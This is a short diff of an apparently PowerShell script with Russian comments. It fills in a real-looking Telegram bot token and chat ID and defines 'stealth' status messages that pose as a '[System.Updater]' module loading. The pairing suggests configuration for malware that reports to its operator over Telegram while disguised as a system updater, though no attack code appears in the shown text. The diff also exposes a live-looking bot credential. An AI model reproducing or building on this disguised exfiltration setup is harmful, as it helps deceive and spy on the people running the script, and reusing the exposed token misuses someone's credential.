@@ -1,6 +1,6 @@
 # --- КОНФИГУРАЦИЯ ---
-$TelegramBotToken = "<ТВОЙ_ТОКЕН_БОТА>"
-$TelegramChatID = "<ТВОЙ_CHAT_ID>"
+$TelegramBotToken = "8392193092:AAFeBWyOvc9FynF-wLYTdqHqSJBu5X-QRkQ"
+$TelegramChatID = "1266539824"
 
 $StealthMessages = @{
     "Initialize"      = "[System.Updater] Инициализация модулей..."
